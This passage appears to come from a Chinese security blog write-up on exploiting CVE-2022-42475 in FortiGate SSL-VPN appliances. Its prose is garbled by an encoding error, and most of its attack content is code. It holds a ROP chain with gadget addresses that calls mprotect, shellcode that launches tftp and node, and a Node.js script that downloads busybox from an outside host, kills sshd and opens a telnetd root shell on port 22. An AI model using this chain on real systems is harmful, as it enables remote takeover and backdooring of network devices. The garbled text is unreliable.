<p>ä¸Šè¿° exp ä¸èƒ½å† real ç¯å¢ƒä¸‹è¾¾åˆ°æ•ˆæœï¼Œä¸»è¦åŸå› æ˜¯è°ƒç”¨ system é»˜è®¤ä¼šè°ƒç”¨/bin/sh -c cmd æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½† real ç¯å¢ƒé‡Œ sysctl ä¸­æ²¡æœ‰ sh åŠŸèƒ½ï¼Œå¯¼è‡´é€šè¿‡ system å‡½æ•°æ— æ³•æˆåŠŸå‘½ä»¤ã€‚</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnuJGJelUGJlpXZvo7JXJ2Pb.png"></p>
<p>æµ‹è¯•ä»£ç </p>
<pre><code>#include &lt;stdio.h&gt;

int main(int argc, char const *argv[])
&#123;
        system(argv[1],0,0);
        return 0;
&#125;
</code></pre>
<h2 id="REAL-EXP"><a href="#REAL-EXP" class="headerlink" title="REAL EXP"></a>REAL EXP</h2><p>ç”±äºåœ¨ real environment ä¸­ sh æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç®€å•ä½¿ç”¨ system æ‰§è¡Œï¼Œä»è€Œæˆ‘ä»¬å°†ç›®å…‰è½¬å‘ exec*å®¶æ—</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcn8EyhtCuWy7ahtW3yie6ggc.png"></p>
<p>å¯ä»¥çœ‹åˆ° init æ–‡ä»¶ä¸­ï¼Œexec å®¶æ—å‡½æ•°è¿˜æ˜¯å¾ˆå…¨çš„ï¼ï¼</p>
<h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p>è¿™é‡Œä¼šé‡åˆ°ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å‘½ä»¤æ‰§è¡Œè¦å¹²ä»€ä¹ˆå‘¢ï¼Ÿæ‰§è¡Œ/bin/sh æ˜¯æ— ç”¨çš„ é‚£æˆ‘ä»¬è¿˜æ€ä¹ˆèƒ½æ‹¿åˆ° shell å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œæˆ‘çš„æƒ³æ³•æ˜¯ ç»™ä»–æƒ³åŠæ³•å¼„ä¸€ä¸ª busybox ï¼Ÿå¯ä»¥è€ƒè™‘æ–¹å¼ 1. åˆ†æ/bin/ä¸­æœ‰ä»€ä¹ˆå¯ä»¥ä¼ è¾“æ–‡ä»¶çš„ç¨‹åº 2.rop å†™ä¸€ä¸ªæ–‡ä»¶å†™å…¥çš„ gadgetï¼Œå¹¶ä¸”ä¼ è¾“è¿‡å»æ–‡ä»¶</p>
<p>æœ€ç»ˆæˆ‘é‡‡ç”¨æ–¹å¼ 1 ï¼ŒåŸå› æ˜¯æ–¹å¼ 2 ä¼ è¾“æ–‡ä»¶å¯èƒ½ä¼šè®©è¾“å…¥è¿‡é•¿ å¯¼è‡´ socket æ–­å¼€ ç­‰ä¸€ç³»åˆ—ç½‘ç»œé—®é¢˜</p>
<h3 id="æ„é€ æ‰§è¡Œ-rop"><a href="#æ„é€ æ‰§è¡Œ-rop" class="headerlink" title="æ„é€ æ‰§è¡Œ rop"></a>æ„é€ æ‰§è¡Œ rop</h3><p>è¿™é‡Œéœ€è¦çŸ¥é“ exec*å®¶æ—æœ‰ä¸¤å¤§æ´¾ç³»ï¼Œä¸€ç§æ˜¯å‚æ•°ä¼ å‚ï¼Œå¦ä¸€ç§æ˜¯æ•°ç»„ä¼ å‚</p>
<pre><code>#include &lt;unistd.h&gt;
int execl(const char *path, const char *arg, ...);
int execlp(const char *file, const char *arg, ...);
int execle(const char *path, const char *arg, ..., char *const envp[]);
int execv(const char *path, char *const argv[]);
int execvp(const char *file, char *const argv[]);
int execve(const char *path, char *const argv[], char *const envp[]);
</code></pre>
<p>é€šè¿‡ç¼–å†™äº†ä¸ª demo ç¨‹åºç†Ÿæ‚‰ä¸€ä¸‹è°ƒç”¨æ–¹å¼,è¿™é‡Œç”¨çš„æ˜¯å‚æ•°ä¼ å‚ï¼ŒåŸå› æ˜¯æˆ‘æƒ³ç›´æ¥ rop åˆ°å¯„å­˜å™¨ç„¶åæ‰§è¡Œ</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
gcc -g test.c -static -o test
void main()
&#123;
  
    execl(&quot;/bin/tftp&quot;,&quot;/bin/tftp&quot;, &quot;192.168.109.128&quot;, &quot;busybox&quot;, &quot;get&quot;, &quot;octet&quot;, &quot;/sbin/busybox&quot;, NULL);
&#125;
</code></pre>
<p>æŸ¥çœ‹ ida</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnP0m4tw82EOVuFkUWH8bFWv.png"></p>
<p>é€šè¿‡ ida ä¹Ÿå¯ä»¥å†ç†Ÿæ‚‰ä¸€ä¸‹ x64 çš„è°ƒç”¨é¡ºåº</p>
<pre><code>rdi rsi rdx rcx r8 r9 stack stack+8 .....
</code></pre>
<p>é‚£æˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ª rop chainï¼Œè‡³å°‘éœ€è¦ä»¥ä¸‹ gadget</p>
<pre><code>è·å–rspåœ°å€ å¹¶ä¸”èƒ½è®¡ç®—rspåç§»
ä¾‹å¦‚ mov reg, rsp;ret, add reg ,offet; ret 
æˆ–è€… push rps; ret pop reg; ret , add reg, offet; ret
å°†æ ˆä¸­åœ°å€ä¼ é€’åˆ°å¯„å­˜å™¨ä¸­
è‡³å°‘éœ€è¦ pop rdiï¼›pop rsiï¼›pop rdxï¼›pop rcx; pop r8;pop r9

call exec* è¿™ä¸ªç¨‹åºä¸­éƒ½æœ‰
</code></pre>
<p>å½“èƒ½æ„é€ å‡ºè¿™äº›å‚æ•°æ—¶ä¼šé‡åˆ°é—®é¢˜ï¼Œæ ˆä¸­å­—ç¬¦ä¸²é—®é¢˜ï¼š</p>
<p>å½“å­—ç¬¦ä¸² byte&gt;8 æ—¶ï¼Œç›´æ¥æ”¾åœ¨æ ˆä¸­ä¼šå¯¼è‡´å ç©ºé—´é¢å¤–å¤šå‡ºä¸€ä¸ªéƒ¨åˆ†</p>
<p>ä¾‹å¦‚æˆ‘ rop ä¸­æ”¾å…¥å­—ç¬¦ä¸² <code>192.168.109.128</code> åˆ™æ ˆä¸­ rsp éƒ¨åˆ†ç¡®å®æ˜¯ è¯¥å­—ç¬¦ä¸²ï¼Œä½† rsp+8 çš„ä½ç½®å´å˜æˆäº† 109.128</p>
<p>è¿™ä¸ªé—®é¢˜ä¼šå¯¼è‡´æˆ‘ä»¬æ„é€ å‚æ•°æ—¶ä¼šå¤šå‡ºä¸å¯æ§çš„å­—ç¬¦ä¸²ã€‚å¯¼è‡´å¦‚æœè€ƒè™‘ char åˆ—è¡¨æ¥è°ƒç”¨çš„è¯ rop chain ä¼šä¿®æ”¹çš„éå¸¸éº»çƒ¦ï¼ï¼ï¼éå¸¸éå¸¸éº»çƒ¦ï¼</p>
<p>ä»è€Œç›®å…‰è½¬å‘å¯„å­˜å™¨ä¼ å‚çš„æ–¹å¼ï¼Œè¯¥æ–¹å¼ä¹Ÿå­˜åœ¨é—®é¢˜</p>
<ol>
<li>å¯„å­˜å™¨ä¼ å‚ rop æ—¶ è¶Šå‘åæ„é€ è¶Šä¼šå‡ºç°æ²¡æœ‰å¥½ç”¨çš„ gadget çš„æƒ…å†µï¼Œå› ä¸ºä½ ä¸èƒ½ç ´åå‰é¢å‡ ä¸ªå‚æ•°</li>
<li>rop æ—¶å­—ç¬¦ä¸²åœ°å€ä¼šå’Œä¸Šä¸€ç§æ–¹å¼ç›¸åŒ ä¼šå‡ºç°å­—ç¬¦ä¸²åœ°å€è¿ç»­çš„æƒ…å†µï¼Œä½†è¯¥æƒ…å†µå¯ä»¥é€šè¿‡å¤šæ¬¡ rop å°†å­—ç¬¦ä¸²åˆ†å‰²ï¼Œå¹¶ä¸”å¤šæ¬¡è®¡ç®— rsp åœ°å€å¾—åˆ°</li>
</ol>
<p>æ­¤æ—¶ æˆ‘çš„æƒ³æ³•æ˜¯ å¦‚ä½•èƒ½å¾—åˆ°éå¸¸å¤Ÿç”¨çš„ gadget å‘¢ï¼Ÿæœ€å¥½çš„æƒ…å†µå°±æ˜¯èƒ½æ‰§è¡Œ shellcode å› ä¸ºè¿™æ ·å°±å¯ä»¥æ»¡è¶³æ¡ä»¶ä¸€ä»¥åŠè½»æ¾çš„æ»¡è¶³æ¡ä»¶äºŒ</p>
<h3 id="ROP2mprotect"><a href="#ROP2mprotect" class="headerlink" title="ROP2mprotect"></a>ROP2mprotect</h3><p>ç†Ÿæ‚‰çš„ ctf æŠ€å·§ï¼Œæƒ³åŠæ³•å°† rop è½¬åŒ–ä¸º ret2shelllcodeï¼Œå°è¯•åœ¨ init ä¸­æœç´¢ mprotect å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ï¼Œå¹¶ä¸”å­˜åœ¨ä¸¤å¤„è°ƒç”¨ï¼Œè¿™éå¸¸æœ‰ç”¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨ rop æ˜¯ç›´æ¥åˆ°è¿™ä¸¤å¤„åœ°å€çš„ä½ç½®è°ƒç”¨ call _mprotect äº†</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnxeKK9gfPb8ZyH2P6Ic0j6g.png"></p>
<p>ä½†è¦æ³¨æ„æˆ‘ä»¬è¿˜æ˜¯éœ€è¦ rop æ„é€  mprotect å‚æ•°ï¼Œé¦–å…ˆ ä¸ºäº†åç»­æ›´å¥½çš„ç»§ç»­æ‰§è¡Œ shellcodeï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®šå½“å‰è¾“å…¥çš„æ ˆç©ºé—´åœ°å€ï¼Œç”±äºæˆ‘ä»¬æ˜¯ ropï¼Œæœ€å¥½ä¸è¦å‡ºç°å›ºå®šåœ°å€ï¼Œé˜²æ­¢ä¸åŒç¯å¢ƒä¸‹å¯èƒ½æ— æ³•é€šç”¨çš„æƒ…å†µï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¹ˆé€‰æ‹© leakï¼Œè¦ä¹ˆé€‰æ‹© rop ä¸­é€šè¿‡ push rspï¼Œpop reg çš„æ–¹å¼è·å¾—å½“å‰æ ˆåœ°å€ï¼ŒåŒæ—¶ç†ç”± add regï¼Œoffse çš„æ–¹å¼æ¥æ§åˆ¶åœ°å€å…·ä½“çš„ä½ç½®</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcn7mlI5ATg53GoRYbzXuWE3c.png"></p>
<p>åœ¨æº¢å‡ºç‚¹ä½ç½® æŸ¥çœ‹ proc mapï¼Œè¿™é‡Œé¦–å…ˆè¦è€ƒè™‘çš„èƒ½è¯»å†™çš„ä½ç½®ï¼Œæ¥ç€æœ€å¥½æ˜¯ç°æœ‰å¯æ§çš„ç©ºé—´</p>
<p>æ­¤æ—¶ï¼Œå¯æ§çš„ç©ºé—´æ˜¯ RDX æ‰€æŒ‡å‘çš„å†…å­˜åœ°å€ï¼Œä»–æ‰€å±çš„å†…å­˜æ®µä¸º 0x7f6de0b2a000ï¼Œæˆ‘ä»¬éœ€è¦å°†æ­¤å†…å­˜ç©ºé—´èµ‹äºˆæ‰§è¡Œæƒé™ï¼Œå¹¶ rop ret åˆ°è¯¥åœ°å€ ä»è€Œè¾¾åˆ° ret2shellcode çš„æ­¥éª¤</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnWH7y3iM7wCNrxkK6vb9zmd.png"></p>
<p>æ‰€ä»¥è¿™æ®µ rop å°±å¯ä»¥æ„é€ äº†</p>
<pre><code>payload = b&quot;B&quot;*2400
        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret
        payload += int_to_bytes(0xfffffffffffa9688) # offset
        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret
        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret
        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret
        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 # #push rdx; pop rdi; ret;
        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5 # : pop rsi ; ret
        payload += int_to_bytes(0x258000) + b&quot;\x00&quot;*5
        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5 # : pop rdx ; ret
        payload += int_to_bytes(0x7) + b&quot;\x00&quot;*7       
        payload += int_to_bytes(0x1537F26) + b&quot;\x00&quot;*4 # jmp _mprotect
</code></pre>
<p>ç®€å•è¯´æ˜ä¸€ä¸‹è¿™æ®µ gadget</p>
<p>pop rax ç”¨æ¥å­˜æ”¾åç§»åœ°å€ï¼Œç”¨æ¥å¾®è°ƒ rsp çš„</p>
<p>Pop rcx æ˜¯ç”±äºæ ˆç©ºé—´å¤šå‡ºäº†ä¸ª 1ï¼Œæ— ç”¨æ•°æ®éœ€è¦å‡ºæ ˆ</p>
<p>æ¥ç€æ˜¯ offsetï¼Œç”¨äºè®¡ç®— proc map base address çš„ï¼Œå°±æ˜¯å½“å‰æ ˆçš„ rsp ä¸å½“å‰å†…å­˜æ®µå…¶å®åœ°å€çš„åç§»ï¼Œç”±äºä¸‹é¢ç”¨åˆ°çš„ add gadget æ‰€ä»¥è¿™é‡Œè¦ç”¨è´Ÿæ•°</p>
<p>Junk op ä¸åšå®é™…æ“ä½œ</p>
<p>Add rdxï¼Œ rax è®¡ç®— rsp çš„åç§» å‡†å¤‡ç»™ä»–æ‰§è¡Œæƒé™</p>
<p>Pop rdi ä½œä¸º mprotect çš„ç¬¬ä¸€ä¸ªå‚æ•° ï¼šåœ°å€</p>
<p>Pop rsi ä½œä¸º mprotect çš„ç¬¬äºŒä¸ªå‚æ•°ï¼š èµ‹äºˆå¤šå¤§çš„ç©ºé—´ len</p>
<p>Pop rdx ä½œä¸º mprotect çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šèµ‹äºˆçš„æƒé™ 7 = r w x</p>
<p>æ¥ç€ è°ƒç”¨ç°æœ‰çš„ gadgetï¼Œjmp mprotect æ‰§è¡Œèµ‹äºˆæƒé™</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnUtUuYJTvlmM2MIJTS3qsbd.png"></p>
<p>rop åæŸ¥çœ‹å½“å‰å†…å­˜ï¼Œå‘ç°å¤šå‡ºäº†ä¸€æ®µå¯æ‰§è¡Œå†…å­˜ã€‚</p>
<h3 id="Ret2shellcode"><a href="#Ret2shellcode" class="headerlink" title="Ret2shellcode"></a>Ret2shellcode</h3><p>æˆ‘ä»¬æˆåŠŸå¾—åˆ°äº†å¯æ‰§è¡Œçš„å†…å­˜ç©ºé—´ï¼Œé‚£æ¥ä¸‹æ¥ åªéœ€è¦ ret åˆ°è¿™é‡Œå°±å¯ä»¥äº†ï¼Œå…·ä½“ ret åˆ°å“ªé‡Œéœ€è¦æˆ‘ä»¬é€šè¿‡å‘åå¡«å…… shellcodeï¼Œå¹¶åœ¨è°ƒè¯•æ—¶è®¡ç®—å‡º offset ä¹‹åå†è·³è½¬è¿‡å»ï¼Œè€Œä¸æ˜¯ç›´æ¥è·³è½¬ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ‰§è¡Œå®Œåè¿˜éœ€è¦å†æ„é€ ä¸€æ®µè®¡ç®— offset çš„ rop chain</p>
<pre><code>payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # pop rax ; ret
payload += int_to_bytes(0x56a40) + b&quot;\x00&quot;*5 # offset to stack
payload += int_to_bytes(0x7d4f4d) + b&quot;\x00&quot;*5 # add rax, rdi ; ret
payload += int_to_bytes(0x43dccc) + b&quot;\x00&quot;*5 # push rax ; ret
</code></pre>
<p>åŒæ ·åˆ©ç”¨ rax å­˜ offset å¾®è°ƒ rsp</p>
<p>rdi æ˜¯ å½“æ—¶è®¡ç®—åçš„ base mem åœ°å€</p>
<p>æœ€åæŠŠè®¡ç®—å‡ºçš„ shellcode åœ°å€ å‹æ ˆ ret</p>
<p>å‚è€ƒä¸‹å›¾ ï¼Œrax å­˜çš„æ˜¯ shellcode çš„åœ°å€ï¼Œå¹¶ä¸”å·²ç»å°†è¯¥åœ°å€å‹æ ˆæ‰§è¡Œ</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnWbt9iKgRGWnks9SXk4ziyh.png"></p>
<h3 id="Shellcode-æ„é€ "><a href="#Shellcode-æ„é€ " class="headerlink" title="Shellcode æ„é€ "></a>Shellcode æ„é€ </h3><p>æ­¤æ—¶æˆ‘ä»¬è§£å†³çš„ gadget ä¸è¶³çš„é—®é¢˜ï¼Œå¯ä»¥éšå¿ƒæ‰€æ¬²çš„ç¼–å†™è°ƒç”¨äº†ï¼Œä¸ºäº†æ›´å¥½çš„æ§åˆ¶å‚æ•°ï¼Œæˆ‘ä»¬é€‰ç”¨ å¯„å­˜å™¨çš„æ–¹å¼ä¼ å‚ï¼Œè¿™é‡Œè¿˜è¦æ³¨æ„ æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨ shellcode ä¸­è°ƒç”¨ exec <em>å®¶æ—ï¼Œå½“ç„¶ä½ å¯ä»¥ syscallï¼Œä½†æ˜¯è¿™é‡Œæˆ‘é€‰æ‹© ret2shellcode ä¸­åªè´Ÿè´£æ„é€ å‚æ•°éƒ¨åˆ†ï¼Œå…·ä½“æ‰§è¡Œ exec</em> çš„äº‹æƒ…äº¤ç»™æ¥ä¸‹æ¥çš„å·¥ä½œã€‚</p>
<pre><code>from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, os=&#39;linux&#39;)

def bytes2stack_bytes(bytes):
    stack_str = &quot;0x&quot;
    swap_data = bytearray(bytes)
    swap_data.reverse()
    for i in swap_data:
        t = hex(i)[2:]
        stack_str+=t
    
    return stack_str
def gen_shellcode_download_file():
    save_path = bytes2stack_bytes(b&quot;/sbin/bu&quot;)
    arg2 = bytes2stack_bytes(b&quot;octet&quot;)
    arg1 = bytes2stack_bytes(b&quot;get&quot;)
    filename = bytes2stack_bytes(b&quot;1.js&quot;)
    ip_addr2 = bytes2stack_bytes(b&quot;109.128&quot;)
    ip_addr1 = bytes2stack_bytes(b&quot;192.168.&quot;)
    
    cmd_path2 = bytes2stack_bytes(b&quot;p&quot;)
    cmd_path1 = bytes2stack_bytes(b&quot;/bin/tft&quot;)
    shellcode = asm(&#39;&#39;&#39;
      sub rsp,0x1000
      push 0
      mov rbx, &#123;&#125;
      push rbx
      mov r9, rsp
      mov rbx, &#123;&#125;
      push rbx
      mov r8, rsp
      mov rbx, &#123;&#125;
      push rbx
      mov rcx,rsp
      mov rbx, &#123;&#125;
      push rbx
      mov rbx, &#123;&#125;
      push rbx
      mov rdx,rsp
      mov rbx,&#123;&#125;
      push rbx
      mov rbx,&#123;&#125;
      push rbx
      mov rsi,rsp
      mov rdi,rsp
      push 0
      mov rbx,&#123;&#125;
      push rbx
      mov r10, rsp
      add rax, 0x90
      mov rsp, rax
      push r10
      sub rsp, 0x8
      nop
      ret
&#39;&#39;&#39;.format(arg2,arg1,filename,ip_addr2,ip_addr1,cmd_path2,cmd_path1,save_path))

    print(shellcode)
    print(len(shellcode))

def gen_shellcode_execl():
    # execl(&quot;/bin/node&quot;,&quot;/bin/node&quot;,&quot;/sbin/bu&quot;)
    js_path = bytes2stack_bytes(b&quot;/sbin/bu&quot;)
    bin_path2 = bytes2stack_bytes(b&quot;e&quot;)
    bin_path1 = bytes2stack_bytes(b&quot;/bin/nod&quot;)
    shellcode = asm(&#39;&#39;&#39;
      sub rsp,0x1000
      mov rcx, 0
      mov rbx, &#123;&#125;
      push rbx
      mov rdx,rsp
      mov rbx,&#123;&#125;
      push rbx
      mov rbx,&#123;&#125;
      push rbx
      mov rsi,rsp
      mov rdi,rsp
      add rax, 0x40
      mov rsp, rax
      nop
      nop
      nop
      ret
&#39;&#39;&#39;.format(js_path, bin_path2, bin_path1))

    print(shellcode)
    print(len(shellcode))
gen_shellcode_execl()
</code></pre>
<p>ç®€å•è¯´æ˜ä¸€ä¸‹ä¸¤æ®µ shellcodeï¼Œéƒ½æ˜¯åœ¨å°†å­—ç¬¦ä¸²å‹æ ˆï¼Œç„¶åè®¡ç®—å½“å‰çš„ rsp åœ°å€ï¼Œå¹¶ä¸”ä¿å­˜åœ°å€åˆ°æ ˆçš„å…¶ä»–ä½ç½®ã€‚ç”±äºæ ˆç©ºé—´çš„æœºåˆ¶ï¼Œæˆ‘ä»¬å­—ç¬¦ä¸²å‹æ ˆæœ€å¤§é•¿åº¦æ˜¯ 8ï¼Œæ‰€ä»¥å½“å¤„ç†å¤§äº 8 çš„å­—ç¬¦ä¸²æ—¶æˆ‘ä»¬éœ€è¦åˆ†å‰²ä¸€ä¸‹å¹¶ä¸”ä»åå‘å‰å‹æ ˆ</p>
<p>æ³¨æ„æˆ‘çš„ shellcode å¼€å¤´ï¼Œå°†æ ˆåˆåšäº†ä¸ªè¿ç§»ï¼Œè¿™ä¸ªåŸå› æ˜¯æ­¤æ—¶ ret2shellcode çš„åœ°å€ä¸æ ˆåœ°å€é‡å  å¦‚æœä¸è¿™ä¹ˆåšï¼Œä¼šå¯¼è‡´ä½ å‹æ ˆçš„æ•°æ®ç ´åæ‰äº†åŸæœ‰çš„ shellcodeï¼Œå¯¼è‡´æ— æ³•ç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦å†å¼€è¾Ÿä¸€æ®µæ–°çš„å ç©ºé—´ï¼Œè¿™é‡Œé€‰æ‹©è¿˜æ˜¯ ssl ç»“æ„ä½“ä¸­çš„ä½ç½®ï¼Œå› ä¸ºæ­¤æ—¶æ•°æ®å‡ä¸º 00000ã€‚</p>
<p>ä¹‹åå°±æ­£å¸¸æ„é€ å‚æ•°ï¼Œå¹¶è¦ç¡®å®šå‚æ•°ä½ç½®å‡æ­£ç¡®ï¼Œä½†ä¸è¦å¿˜è®°ï¼ï¼ï¼æˆ‘ä»¬ shellcode æœ€ç»ˆä½ç½®éœ€è¦æ‰§è¡Œ retï¼Œä½†æ˜¯ ret å»å“ªé‡Œå‘¢ï¼Ÿæˆ‘ä»¬è¿˜éœ€è¦è®¡ç®—ä¸€ä¸‹æ¥ä¸‹æ¥çš„ rop æ‰€å­˜å†…å­˜åœ°å€ä¸å½“å‰å¯æ§åœ°å€çš„åç§»ï¼Œå¹¶ä¸”è¿™æ®µè®¡ç®—éœ€è¦æå‰æ”¾åœ¨ shellcode ä¸­ã€‚</p>
<p>è¿™é‡Œè¿˜æœ‰ä¸ªå‘ç‚¹!!!!</p>
<p>å°±æ˜¯æœ€ä¸Šè¿°ä¸­è¯´çš„ï¼Œå¯„å­˜å™¨å‚æ•°å¹¶ä¸å¤Ÿï¼Œè¿˜æœ‰ä¸¤ä¸ªå‚æ•°éœ€è¦åœ¨æ ˆä¸­ï¼Œæ³¨æ„æ˜¯è¿™æŒ‡å‘è¿™ä¸¤ä¸ªå‚æ•°çš„åœ°å€åœ¨æ ˆä¸­ï¼Œï¼ï¼ï¼ä¸æ˜¯å­—ç¬¦ä¸²ï¼ï¼ï¼ å…¶ä»–å¯„å­˜å™¨å‚æ•°ä¹ŸåŒæ ·æ˜¯å‚æ•°çš„åœ°å€ è€Œä¸æ˜¯å­—ç¬¦ä¸²ï¼ï¼ï¼ï¼</p>
<p>ä»¥åŠè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²åœ°å€å¹¶ä¸æ˜¯å‹åœ¨ shellcode æ‰€åœ¨çš„æ ˆä¸­ï¼Œè€Œæ˜¯éœ€è¦åœ¨è®¡ç®—å‡º rop å¤„åœ°å€åçš„ä¸‹ä¸€ä¸ªåœ°å€ï¼ŒåŸå› åœ¨ ret åæ ˆç©ºé—´ä¼šè·‘åˆ° rop æ‰€å¤„åœ°å€ï¼Œæ­¤æ—¶æ ˆçš„ rsp æ˜¯ rop gadget+8 çš„ä½ç½®ï¼Œé‚£åœ¨ shellcode ä¸­åˆ™éœ€è¦å…ˆè®¡ç®—å‡º gadget+8 çš„åœ°å€å¹¶ä¸”å‹å…¥æ ˆä¸­ååœ¨ ret è¿‡å»</p>
<p>push å‰ï¼š</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnUEY5SpeGZqD7ZGtx0SaRcg.png"></p>
<p>push åï¼Œå¯ä»¥çœ‹åˆ° push æ˜¯å°†å­—ç¬¦ä¸²å‹æ ˆè¿›äº† c8 çš„ä½ç½®ï¼Œè€Œä¸æ˜¯ d0ï¼Œè¿™é‡Œæ˜¯éœ€è¦æ³¨æ„çš„</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcn22rswcryeUmWF8bVCknsod.png"></p>
<p>ret å‰çš„å †æ ˆ + å¯„å­˜å™¨ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°æ»¡è¶³è°ƒç”¨å¸ƒå±€</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcndCjP87RZaZKYX77x4nGJ6g.png"></p>
<p>æœ€ç»ˆæˆåŠŸä¸‹è½½åˆ°æ–‡ä»¶ï¼ˆå·¦ä¾§æ˜¯æœ€ç»ˆæ‰§è¡Œ execv å‰çš„æ ˆç©ºé—´ä¿¡æ¯ï¼Œå³ä¾§æ˜¯æˆåŠŸä¸‹è½½æ–‡ä»¶çš„å®ä¾‹ï¼‰</p>
<p><img src="/2023/02/09/CVE-2022-42475/static/boxcnvSYnaWmZLkzG8nK9Bba6Ug.png"></p>
<p>æ¥ç€é€šè¿‡ node æ–‡ä»¶å»æ„é€ æ–‡ä»¶ä¸‹è½½åŠåç»­ getshell çš„æ–¹æ³•</p>
<h3 id="Nodejs-shellcode"><a href="#Nodejs-shellcode" class="headerlink" title="Nodejs shellcode"></a>Nodejs shellcode</h3><p>å½“ä¸‹è½½ä¸‹æ¥å‘ç°ï¼ŒåŸæ¥é€šè¿‡ tftp ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶ åªæœ‰è¯»å†™æƒé™ï¼ï¼å¹¶æ²¡æœ‰æ‰§è¡Œæƒé™ï¼ï¼ï¼é‚£æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥ busybox æˆ–è€…å…¶ä»– backdoor ç¨‹åºï¼Œå› ä¸ºä¸èƒ½æ‰§è¡Œã€‚</p>
<p>å½“ç„¶æ­¤å¤„çš„æ ‡é¢˜å°±æ˜¯è§£å†³æ–¹æ³•äº†ï¼Œåœ¨æœç´¢æ—¶å‘ç°é£å¡”å±…ç„¶å†…ç½®äº†ä¸ª nodejsï¼é€šè¿‡æµ‹è¯•å‘ç° nodejs xx.js æ˜¯å¯æ‰§è¡Œçš„ï¼Œå¹¶ä¸” nodejs ä¹Ÿå­˜åœ¨ä¿®æ”¹æ–‡ä»¶æƒé™çš„å‡½æ•°ï¼Œé‚£æ­¤æ—¶æ€è·¯å°±æ›´æ¸…æ™°äº†</p>
<ol>
<li>é€šè¿‡ä¹‹å‰çš„å‘½ä»¤æ‰§è¡Œä¸‹è½½ shell.js</li>
<li>shell.js ä¸­è‡³å°‘è¦åŒ…å«ä»¥ä¸‹åŠŸèƒ½</li>
<li>ä¸€ï¼šä¸‹è½½ busybox ï¼ˆæ¯”ä¹‹å‰çš„æ“ä½œç®€å•å¤šäº†ï¼ï¼‰</li>
<li>äºŒï¼šç»™ busybox æ‰§è¡Œæƒé™</li>
<li>ä¸‰ï¼šå¼„ä¸€ä¸ª busybox çš„ shell è½¯é“¾</li>
<li>å››ï¼šè°ƒç”¨ busybox ä¸­å†…ç½®çš„å‘½ä»¤ èµ· shell</li>
</ol>
<p>æœ€ç»ˆæˆåŠŸæ„é€ å‡ºä»¥ä¸‹ shellcode</p>
<pre><code>var fs = require(&#39;fs&#39;);
const https = require(&#39;https&#39;)

const &#123; execFile, execFileSync &#125; = require(&#39;child_process&#39;);

function exp() &#123;
         const file2 = &#39;/bin/ash&#39;;
        fs.access(file2, fs.constants.F_OK, (err) =&gt; &#123;
          if (err) &#123;
                  try&#123;
                    const res = fs.symlinkSync(&#39;/sbin/busybox&#39;,&#39;/bin/ash&#39;);
                    console.log(&#39;ash create success&#39;);
                    
                &#125;catch(ex)&#123;
                    console.log(&#39;ash create error&#39; + ex);
                &#125;
          &#125;else &#123;
                  console.log(&#39;ash already created&#39;);
          &#125;
        &#125;);


        const stdout1 = execFileSync(&#39;/bin/killall&#39;, [&#39;sshd&#39;]);
        const stdout2 = execFileSync(&#39;/sbin/busybox&#39;, [&#39;telnetd&#39;, &#39;-l&#39;, &#39;/bin/ash&#39;, &#39;-b&#39;, &#39;0.0.0.0&#39;, &#39;-p&#39;,&#39;22&#39;]);
        console.log(stdout1);
        console.log(stdout2);
        console.log(&#39;shell process create success&#39;);
&#125;

const file1 = &#39;/sbin/busybox&#39;;
fs.access(file1, fs.constants.F_OK, (err) =&gt; &#123;
  if (err) &#123;
          try&#123;
            execFile(&#39;/bin/tftp&#39;, [&#39;192.168.109.128&#39;,&#39;busybox&#39;,&#39;get&#39;, &#39;octet&#39;, &#39;/sbin/busybox&#39;], (err, stdout, stderr) =&gt; &#123;
            if(err) &#123;
                console.log(err);
                return;
            &#125;
            console.log(&#39;download success&#39;);
            fs.chmodSync(&#39;/sbin/busybox&#39;, 777);
            console.log(&#39;chmod success&#39;);
            exp();
        &#125;);
        
            
        &#125;catch(ex)&#123;
            console.log(&#39;ash create error&#39; + ex);
        &#125;
  &#125;else &#123;
          console.log(&#39;busybox already download&#39;);
          exp();
          
  &#125;
